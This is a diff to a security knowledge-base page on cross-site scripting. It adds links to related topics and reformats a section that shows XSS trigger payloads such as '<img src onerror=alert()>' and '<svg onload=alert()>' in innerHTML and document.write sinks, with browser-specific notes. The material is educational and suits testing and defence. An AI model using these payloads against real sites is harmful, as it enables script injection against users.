@@ -10,6 +10,18 @@ description: Inject JavaScript code on victims to perform actions on their behal
 [javascript](../../../languages/javascript/)
 {% endcontent-ref %}
 
+{% content-ref url="html-injection.md" %}
+[html-injection.md](html-injection.md)
+{% endcontent-ref %}
+
+{% content-ref url="content-security-policy-csp.md" %}
+[content-security-policy-csp.md](content-security-policy-csp.md)
+{% endcontent-ref %}
+
+{% content-ref url="postmessage-exploitation.md" %}
+[postmessage-exploitation.md](postmessage-exploitation.md)
+{% endcontent-ref %}
+
 ## Description
 
 Cross-Site Scripting (XSS) is a very broad topic, but it revolves around one idea: executing malicious JavaScript. This is often from an attacker's site, hence "Cross-Site" scripting. A common distinction made between types of XSS is:
@@ -377,31 +389,19 @@ JQuery also has many other methods and CVEs if malicious input ends up in specif
 
 #### Triggers (HTML sinks)
 
-1. {% code title=".innerHTML" %}
-   ```javascript
-   let div = document.createElement("div")
-   div.innerHTML = "<img src onerror=alert()>"
-   ```
-   {% endcode %}
-2. {% code title=".innerHTML + DOM" %}
-   ```javascript
-   let div = document.createElement("div")
+1. <pre class="language-javascript" data-title=".innerHTML"><code class="lang-javascript">let div = document.createElement("div")
+   div.innerHTML = "&#x3C;img src onerror=alert()>"
+   </code></pre>
+2. <pre class="language-javascript" data-title=".innerHTML + DOM"><code class="lang-javascript">let div = document.createElement("div")
    document.body.appendChild(div)
-   div.innerHTML = "<img src onerror=alert()>"
-   ```
-   {% endcode %}
-3. {% code title="write()" %}
-   ```javascript
-   document.write("<img src onerror=alert()")
-   ```
-   {% endcode %}
-4. {% code title="open() write() close()" %}
-   ```javascript
-   document.open()
-   document.write("<img src onerror=alert()")
+   div.innerHTML = "&#x3C;img src onerror=alert()>"
+   </code></pre>
+3. <pre class="language-javascript" data-title="write()"><code class="lang-javascript">document.write("&#x3C;img src onerror=alert()")
+   </code></pre>
+4. <pre class="language-javascript" data-title="open() write() close()"><code class="lang-javascript">document.open()
+   document.write("&#x3C;img src onerror=alert()")
    document.close()
-   ```
-   {% endcode %}
+   </code></pre>
 
 When placing common XSS payloads in the triggers above, it becomes clear that they are not all the same. Most notably, the `<img src onerror=alert()>` payload is the most universal as it works in every situation, even when it is not added to the DOM yet. The common and short `<svg onload=alert()>` payload is interesting as it is only triggered via `.innerHTML` on Chome, and not Firefox. Lastly, the `<script>` tag does not load when added with `.innerHTML` at all.
 
